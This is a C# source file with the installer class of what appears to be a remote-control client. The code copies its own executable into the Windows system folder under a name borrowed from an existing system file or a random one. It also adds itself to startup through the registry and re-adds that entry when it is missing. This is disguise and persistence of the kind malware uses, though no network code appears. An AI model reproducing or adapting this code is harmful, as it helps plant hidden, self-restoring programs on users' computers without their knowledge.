using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace LinkUs.Client.Install
{
    public class Installer
    {
        private readonly IEnvironment _environment;
        private readonly IFileService _fileService;
        private readonly IRegistry _registry;

        // ----- Constructor
        public Installer(
            IEnvironment environment,
            IFileService fileService,
            IRegistry registry)
        {
            _environment = environment;
            _fileService = fileService;
            _registry = registry;
        }

        // ----- Public methods
        public string Install()
        {
            var currentInstalledApplicationPath = _registry.GetFileLocation();
            if (string.IsNullOrEmpty(currentInstalledApplicationPath)) {
                return ProcessInstall();
            }
            else if (string.Equals(currentInstalledApplicationPath, _environment.ApplicationPath, StringComparison.InvariantCultureIgnoreCase)) {
                CheckInstall();
                return currentInstalledApplicationPath;
            }
            else {
                var installedVersion = _fileService.GetAssemblyVersion(currentInstalledApplicationPath);
                if (installedVersion >= _environment.CurrentVersion) {
                    throw new HigherVersionAlreadyInstalled(currentInstalledApplicationPath);
                }
                else {
                    return ProcessInstall();
                }
            }
        }
        public void Uninstall()
        {
            _registry.RemoveFileFromStartupRegistry(_environment.ApplicationPath);
            _registry.ClearFileLocation();
        }
        public bool WellLocated()
        {
            var parentDirectory = Path.GetDirectoryName(_environment.ApplicationPath);
            return string.Equals(GetInstallationDirectory(), parentDirectory, StringComparison.CurrentCultureIgnoreCase);
        }
        public void CheckInstall()
        {
            if (_registry.IsRegisteredAtStartup(_environment.ApplicationPath) == false) {
                _registry.AddFileToStartupRegistry(_environment.ApplicationPath);
            }
            if (_registry.GetFileLocation() != _environment.ApplicationPath) {
                _registry.SetFileLocation(_environment.ApplicationPath);
            }
        }

        // ----- Internal logic
        private string ProcessInstall()
        {
            var fileName = _fileService.GetFileNameCopiedFromExisting(GetInstallationDirectory()) ?? _fileService.GetRandomFileName();
            var targetFilePath = Path.Combine(GetInstallationDirectory(), fileName);

            _fileService.Copy(_environment.ApplicationPath, targetFilePath);
            _registry.AddFileToStartupRegistry(targetFilePath);
            _registry.SetFileLocation(targetFilePath);

            return targetFilePath;
        }
        private string GetInstallationDirectory()
        {
            // For 64bit operating system, when trying to copy file to
            // system32, it copies file in C:\WINDOWS\SysWOW64 because of
            // file redirector. (system32 directory contains only 64bit programs.)
            if (_environment.Is64Bit) {
                return Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
            }
            else {
                return Environment.GetFolderPath(Environment.SpecialFolder.System);
            }
        }
    }
}